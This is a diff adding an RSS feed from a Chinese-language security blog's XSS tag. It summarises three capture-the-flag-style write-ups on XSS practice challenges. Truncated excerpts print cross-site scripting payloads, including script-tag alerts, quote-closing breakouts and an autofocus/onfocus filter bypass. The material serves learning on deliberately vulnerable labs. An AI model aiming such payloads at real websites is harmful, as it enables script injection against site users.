@@ -1,0 +1,31 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>XSS - Tag - Hannibal0x の Blog</title>
+        <link>https://hannibal0x.github.io/tags/xss/</link>
+        <description>XSS - Tag - Hannibal0x の Blog</description>
+        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Sun, 04 Apr 2021 15:13:00 &#43;0000</lastBuildDate><atom:link href="https://hannibal0x.github.io/tags/xss/" rel="self" type="application/rss+xml" /><item>
+    <title>XSS-Labs</title>
+    <link>https://hannibal0x.github.io/2021-04-04-xss-labs/</link>
+    <pubDate>Sun, 04 Apr 2021 15:13:00 &#43;0000</pubDate>
+    <author>Hannibal0x</author>
+    <guid>https://hannibal0x.github.io/2021-04-04-xss-labs/</guid>
+    <description><![CDATA[Level1 url/?name=&lt;script&gt;alert(1)&lt;/script&gt; Level2 考察符号的闭合 url/?keyword='"&gt;&lt;script&gt;alert(1)&lt;/script&gt; Level3 htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。考察过滤&lt;、&gt;、&ldquo;等的绕过。 url?keyword=' autofocus onfocus=alert(1)// Level4 会删除掉&lt;和&g]]></description>
+</item>
+<item>
+    <title>prompt(1) to win</title>
+    <link>https://hannibal0x.github.io/2021-03-31-prompt1-to-win/</link>
+    <pubDate>Wed, 31 Mar 2021 14:48:00 &#43;0000</pubDate>
+    <author>Hannibal0x</author>
+    <guid>https://hannibal0x.github.io/2021-03-31-prompt1-to-win/</guid>
+    <description><![CDATA[http://prompt.ml 0x00 function escape(input) { // warm up // script should be executed without user interaction return '&lt;input type="text" value="' + input + '">'; } 简单闭合下，构造&quot;&gt;&lt;script&gt;prompt(1);&lt]]></description>
+</item>
+<item>
+    <title>XSS弹窗挑战</title>
+    <link>https://hannibal0x.github.io/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/</link>
+    <pubDate>Sat, 27 Mar 2021 07:21:00 &#43;0000</pubDate>
+    <author>Hannibal0x</author>
+    <guid>https://hannibal0x.github.io/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/</guid>
+    <description><![CDATA[练练手，https://xss.haozi.me/#/ 0x00 输入&lt;script&gt;alert(1);&lt;/script&gt; 0x01 Server]]></description>
+</item>
+</channel>
+</rss>
